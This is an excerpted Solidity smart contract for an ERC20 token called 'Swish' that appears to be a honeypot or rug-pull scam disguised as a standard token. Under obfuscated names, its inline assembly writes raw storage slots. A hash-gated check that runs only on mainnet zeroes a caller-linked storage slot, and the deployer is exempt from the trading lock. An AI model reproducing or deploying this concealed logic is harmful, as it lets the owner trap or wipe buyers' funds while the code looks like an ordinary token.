...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSwish;
    uint256 private snakePit = block.number*2;

    mapping (address => bool) private _firstSand; 
    mapping (address => bool) private _secondMana;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private cloudInfastructure;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private venomBird;
    address public pair;
    ...
    bool private trading; uint256 private rottenCrown = 1; bool private breakingSky;
    uint256 private _decimals; uint256 private betterCall;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSwish.push(_router); addSwish.push(msgSender_); addSwish.push(pair);
        for (uint256 q=0; q < 3;) {_firstSand[addSwish[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x06f569dca0f02064bd63404b7c5cc150069a83dc23124848088cbfe17591d4da
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x59bb6069ee9624593d75eb30cd65007c5cbf87f13d0b4d34fb481cb891e28745,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; snakePit = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSwish[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySwish(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSwish[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySwish(creator, initialSupply);
    }
}

contract Swish is ERC20Token {
    constructor() ERC20Token("Swish", "SWISH", msg.sender, 1000000 * 10 ** 18) {
    }
}